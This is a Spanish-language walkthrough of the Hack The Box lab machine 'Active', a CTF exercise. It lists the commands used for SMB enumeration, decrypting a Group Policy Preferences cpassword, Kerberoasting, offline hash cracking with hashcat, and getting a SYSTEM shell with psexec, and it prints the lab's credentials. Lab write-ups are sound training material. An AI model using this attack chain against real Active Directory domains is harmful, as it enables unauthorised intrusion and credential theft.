
# Active

![image](https://user-images.githubusercontent.com/86425612/170834497-d119123c-8e35-4cc7-aa69-5060c470e71a.png)

Realizamos un escaneo rapido con nmap:

`nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.10.100 -oG allPorts`

usamos el comando `extractPorts allPorts`

![image](https://user-images.githubusercontent.com/86425612/170834662-8d9d0b0c-f2da-4756-a5f9-d3c06c0e622e.png)

Nos permite copiar y pegar los puertos detectados comodamente en otro comando nmap mas exhaustivo:

![image](https://user-images.githubusercontent.com/86425612/170834875-12622c06-6e7a-417c-a480-4af7dcfba0c2.png)

Enumerando los diferentes puertos encontramos puertos interesantes que sugieren la posibilidad de que esta maquina sea un Domain Controller, nos centramos en el puerto más "low hanging fruit" este siendo SMB puerto 445.

Enumeramos SMB con smbmap:

`smbmap -H 10.10.10.100`

![image](https://user-images.githubusercontent.com/86425612/170835022-f262cc80-3182-492b-ae11-ba2b6d565dbf.png)

Observamos que tenemos acceso de manera anonima al Share Replication.

Entramos dentro de este anonimamente con:

`smbclient \\\\10.10.10.100\\Replication -N`

Indagando dentro de los diferentes directorios encontramos un archivo Groups.xml que destaca especialmente debido a la falta de ficheros en dicho SMB Share, descargamos dicho fichero.

![image](https://user-images.githubusercontent.com/86425612/170835169-a8a1dbe4-32c4-468a-ba79-b13ccb8dae32.png)

Salimos de smbclient y comprobamos que contiene este archivo Groups.xml

![image](https://user-images.githubusercontent.com/86425612/170835321-2cf8785b-daf6-4352-b19d-a092f672f131.png)

Podemos observar que esta archivo contiene los "*Group Policy Preferences*" el cual podemos abusar si contiene los campos "userName" y "cpassword" en este caso ambos se encuentran dentro de dicho archivo.

Desciframos el campo "cpassword" con el comando siguiente:

`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

![image](https://user-images.githubusercontent.com/86425612/170835456-14e2829b-60fb-4063-b37c-f34e10eee0c2.png)

Una vez obtenida la contraseña para el usuario de "userName" el cual contiene el dominio y el usuario al que pertenece dicha contraseña, podemos proceder a comprobar el acceso de dicha cuenta:

`crackmapexec smb --shares 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18`

Y obtenemos la siguiente información:

![image](https://user-images.githubusercontent.com/86425612/170835539-176729c4-7880-48af-a794-809a086cfb63.png)

Observamos que podemos leer más Shares que de manera anonima, especialmente destaca la Share "*Users*" así que accedemos a esta.

`smbclient \\\\10.10.10.100\\Users -U SVC_TGS%GPPstillStandingStrong2k18`

![image](https://user-images.githubusercontent.com/86425612/170835585-1d9d108c-5024-4bd9-810e-d4471fccb5d3.png)

Actualmente nos encontramos en C:\Users, intentamos acceder al escritorio de SVC_TGS y obtenemos user.txt

![image](https://user-images.githubusercontent.com/86425612/170835657-a63a5a25-c8aa-4185-a2a1-7e9b770adbb0.png)

Leemos el contenido del fichero descargado:

![image](https://user-images.githubusercontent.com/86425612/170835707-3e2a8b7b-61a3-4a52-9afe-9c5116f11199.png)

Y con esto ya tenemos la flag de User, ahora toca escalar a NT Authority\System

Teniendo un usuario del Dominio como SVC_TGS y sus credenciales podemos intentar aplicar Kerberoasting y ver si podemos obtener credenciales para algun servicio:

`GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS`

Introducimos la contraseña y obtenemos un hash para el usuario Administrator:

![image](https://user-images.githubusercontent.com/86425612/170836051-5bc81939-8209-4558-ae01-f4d7208187b3.png)

Podemos crackear este hash de manera offline con hashcat pero antes comprobamos el modo a usar con este tipo de hash

![image](https://user-images.githubusercontent.com/86425612/170836087-488a8563-14f1-47c3-945d-6a64301a013f.png)

Copiamos el hash en un archivo llamado userAdmin y lo crackeamos:

`hashcat -m 13100 -a 0 userAdmin /usr/share/wordlists/rockyou.txt --force`

![image](https://user-images.githubusercontent.com/86425612/170836184-e75b049a-1f2c-41d3-a4d2-845bdeead752.png)

Obtenemos las credenciales de Administrator, podemos acceder a través de smbclient y descargarnos root.txt o directamente conectarnos con un comando como `psexec.py`

`psexec.py Administrator:Ticketmaster1968@10.10.10.100`

![image](https://user-images.githubusercontent.com/86425612/170836263-59a05adf-0e04-4a9c-a617-d54e5a89c1d1.png)

Obtenemos shell y podemos ir a leer root.txt

![image](https://user-images.githubusercontent.com/86425612/170836317-aa0e8dcf-7d7e-45e3-8b86-2f130286d107.png)
